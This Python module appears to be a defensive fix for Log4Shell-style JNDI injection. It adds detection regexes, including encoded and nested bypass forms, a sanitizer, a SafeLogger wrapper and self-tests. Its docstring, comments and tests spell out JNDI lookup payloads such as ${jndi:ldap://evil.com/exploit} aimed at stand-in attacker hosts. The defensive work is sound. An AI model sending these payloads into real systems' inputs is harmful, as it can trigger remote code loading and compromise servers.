"""
Fix: Log4j JNDI Injection in Custom Logging Framework
======================================================
Issue #342 — JNDI injection (Log4Shell-style) occurs when user-controlled
data is included in log messages that get passed to a JNDI lookup.
Attackers craft payloads like ${jndi:ldap://attacker.com/a} which, when
processed by a vulnerable JNDI-based logging framework, trigger a remote
class loading, leading to RCE.

This fix provides:
1. JNDI lookup string sanitization in log messages
2. Disable JNDI functionality by default
3. Allow-list based safe logging
4. Input validation and pattern detection
"""

from __future__ import annotations

import os
import re
from typing import Any


# ═══════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════

# Feature flag: disable JNDI globally (RECOMMENDED)
JNDI_ENABLED = os.environ.get("JNDI_ENABLED", "false").lower() == "true"

# Max log message length (prevent DoS via huge messages)
MAX_LOG_LENGTH = 100 * 1024  # 100 KB

# ═══════════════════════════════════════════════════════════════════
# Custom Error
# ═══════════════════════════════════════════════════════════════════


class JNDIInjectionError(ValueError):
    """Raised when a JNDI injection attempt is detected."""


# ═══════════════════════════════════════════════════════════════════
# JNDI Pattern Detection
# ═══════════════════════════════════════════════════════════════════

# JNDI lookup patterns: ${jndi:<protocol>://...}
JNDI_LOOKUP_PATTERN = re.compile(
    r"\$\{jndi:(ldap|ldaps|rmi|dns|iiop|corba|nis|nds|http|https)://",
    re.IGNORECASE,
)

# Additional JNDI-related patterns
JNDI_ESCAPED_PATTERNS = [
    # Lower-case variants
    re.compile(r"\$\{jndi:", re.IGNORECASE),
    # URL-encoded variants
    re.compile(r"%24%7Bjndi:", re.IGNORECASE),
    re.compile(r"%24%7Bjndi%3A", re.IGNORECASE),
    # Unicode-escaped variants
    re.compile(r"\\u0024\\u007bjndi:", re.IGNORECASE),
    # Nested JNDI lookups (used to bypass filters)
    re.compile(r"\$\{.*?\$\{.*?jndi:", re.IGNORECASE),
    # Other dangerous lookup prefixes
    re.compile(r"\$\{env:", re.IGNORECASE),
    re.compile(r"\$\{sys:", re.IGNORECASE),
]


def contains_jndi_injection(message: str) -> bool:
    """Check if a log message contains JNDI injection patterns.

    Args:
        message: Log message to check.

    Returns:
        True if a JNDI injection pattern is detected.
    """
    if JNDI_LOOKUP_PATTERN.search(message):
        return True

    for pattern in JNDI_ESCAPED_PATTERNS:
        if pattern.search(message):
            return True

    return False


# ═══════════════════════════════════════════════════════════════════
# 1. SAFE LOGGING — The Primary Fix
# ═══════════════════════════════════════════════════════════════════


def sanitize_log_message(message: str) -> str:
    """Sanitize a log message by stripping JNDI lookup syntax.

    This is the PRIMARY fix: strip ${...} lookup patterns that
    could trigger JNDI lookups before the message reaches the
    logging framework.

    Strategy: Replace JNDI-like patterns with a safe marker,
    rather than rejecting the message outright, to avoid
    information loss during debugging.

    Args:
        message: Raw log message (may contain user input).

    Returns:
        Sanitized log message with JNDI patterns removed.
    """
    if not isinstance(message, str):
        message = str(message)

    if len(message) > MAX_LOG_LENGTH:
        message = message[:MAX_LOG_LENGTH] + " [TRUNCATED]"

    # Strip JNDI lookups: ${jndi:ldap://...} → [JNDI_REDACTED]
    sanitized = JNDI_LOOKUP_PATTERN.sub("[JNDI_REDACTED]://", message)

    # Close any dangling braces from the substitution
    sanitized = sanitized.replace("${", "{")  # Remove $ before {lookup}
    sanitized = sanitized.replace("$%7B", "%7B")  # Remove $ before %7B{

    return sanitized


def safe_log_message(message: str) -> str:
    """Process a log message safely, rejecting JNDI if detected.

    Unlike sanitize_log_message which strips patterns, this function
    REJECTS messages containing JNDI patterns when JNDI is disabled.

    Args:
        message: Log message to process.

    Returns:
        Safe log message string.

    Raises:
        JNDIInjectionError: If JNDI injection is detected and
            JNDI is disabled.
    """
    if not JNDI_ENABLED and contains_jndi_injection(message):
        raise JNDIInjectionError(
            "JNDI lookup patterns detected in log message. "
            "JNDI is disabled for security. "
            "Use sanitize_log_message() if you need to log "
            "user-controlled data that may contain ${} syntax."
        )

    return sanitize_log_message(message)


# ═══════════════════════════════════════════════════════════════════
# 2. SAFE LOGGER CLASS — Drop-in Replacement
# ═══════════════════════════════════════════════════════════════════


class SafeLogger:
    """Logging wrapper that protects against JNDI injection.

    Use this as a drop-in replacement for any custom logging
    framework that may be vulnerable to Log4Shell-style attacks.
    """

    def __init__(self, name: str, reject_on_jndi: bool = True):
        self.name = name
        self.reject_on_jndi = reject_on_jndi

    def _format(self, level: str, message: str, **kwargs: Any) -> str:
        """Format and sanitize a log message."""
        # Sanitize the main message
        safe_msg = sanitize_log_message(message)

        # Sanitize any structured data values
        safe_kwargs = {}
        for key, value in kwargs.items():
            if isinstance(value, str):
                safe_kwargs[key] = sanitize_log_message(value)
            else:
                safe_kwargs[key] = value

        if safe_kwargs:
            extra = " " + " ".join(
                f"{k}={v}" for k, v in safe_kwargs.items()
            )
        else:
            extra = ""

        formatted = f"[{level}] {self.name}: {safe_msg}{extra}"

        # If rejecting on JNDI, check after formatting
        if self.reject_on_jndi and contains_jndi_injection(message):
            raise JNDIInjectionError(
                f"JNDI injection blocked in log message: {formatted[:200]}"
            )

        return formatted

    def info(self, message: str, **kwargs: Any) -> str:
        """Log an INFO-level message safely."""
        return self._format("INFO", message, **kwargs)

    def warn(self, message: str, **kwargs: Any) -> str:
        """Log a WARN-level message safely."""
        return self._format("WARN", message, **kwargs)

    def error(self, message: str, **kwargs: Any) -> str:
        """Log an ERROR-level message safely."""
        return self._format("ERROR", message, **kwargs)

    def debug(self, message: str, **kwargs: Any) -> str:
        """Log a DEBUG-level message safely."""
        return self._format("DEBUG", message, **kwargs)


# ═══════════════════════════════════════════════════════════════════
# 3. Before / After example
# ═══════════════════════════════════════════════════════════════════

# B E F O R E  (vulnerable — JNDI injection):
#
#   class CustomLogger:
#       def log(self, msg):
#           # ❌ Passes user input directly to JNDI-aware framework
#           jndi_lookup(msg)
#           print(msg)
#
#   logger = CustomLogger()
#   logger.log("User login: " + user_input)
#   # Attacker sends: ${jndi:ldap://evil.com/exploit}
#   # → Logger performs JNDI lookup → RCE!

# A F T E R  (fixed):
#
#   from fixes.log4j_fix import SafeLogger
#
#   logger = SafeLogger("myapp")
#   logger.info("User login: {}", user_input)
#   # ${jndi:ldap://evil.com/exploit} → [JNDI_REDACTED]://evil.com/exploit
#   # OR raises JNDIInjectionError


# ═══════════════════════════════════════════════════════════════════
# 4. Self-test
# ═══════════════════════════════════════════════════════════════════


def _test() -> None:
    # ── JNDI pattern detection: LDAP ──
    assert contains_jndi_injection("${jndi:ldap://evil.com/a}")
    print("  ✓ JNDI LDAP detected")

    # ── JNDI pattern detection: RMI ──
    assert contains_jndi_injection("${jndi:rmi://evil.com/a}")
    print("  ✓ JNDI RMI detected")

    # ── JNDI pattern detection: DNS ──
    assert contains_jndi_injection("${jndi:dns://evil.com/a}")
    print("  ✓ JNDI DNS detected")

    # ── Normal messages pass through ──
    assert not contains_jndi_injection("User alice logged in")
    print("  ✓ Normal messages not flagged")

    # ── Messages with curly braces but no JNDI ──
    result = sanitize_log_message("User {name} logged in")
    assert "[JNDI_REDACTED]" not in result
    print("  ✓ Curly braces in normal messages preserved")

    # ── Sanitize JNDI in user message ──
    result = sanitize_log_message(
        "Login from ${jndi:ldap://evil.com/exploit}"
    )
    assert "[JNDI_REDACTED]" in result
    # Verify the ${jndi: lookup syntax is gone
    assert "jndi:ldap" not in result.lower()
    print("  ✓ JNDI patterns sanitized")

    # ── SafeLogger: normal message ──
    logger = SafeLogger("test", reject_on_jndi=True)
    result = logger.info("User alice logged in")
    assert "[INFO]" in result
    assert "test:" in result
    print("  ✓ SafeLogger: normal message")

    # ── SafeLogger: reject JNDI ──
    try:
        logger.info("Login from ${jndi:ldap://evil.com/exploit}")
        assert False, "JNDI injection was not rejected!"
    except JNDIInjectionError:
        pass
    print("  ✓ SafeLogger: JNDI injection rejected")

    # ── SafeLogger: sanitize mode ──
    safe_logger = SafeLogger("test", reject_on_jndi=False)
    result = safe_logger.info("Login from ${jndi:ldap://evil.com/exploit}")
    assert "[JNDI_REDACTED]" in result
    print("  ✓ SafeLogger: JNDI sanitized (non-reject mode)")

    # ── Truncation of oversized messages ──
    long_msg = "A" * (MAX_LOG_LENGTH + 100)
    result = sanitize_log_message(long_msg)
    assert len(result) <= MAX_LOG_LENGTH + 20  # truncation marker
    assert "[TRUNCATED]" in result
    print("  ✓ Oversized messages truncated")

    print("\n✅ Log4j JNDI injection fix: ALL TESTS PASSED")


if __name__ == "__main__":
    _test()
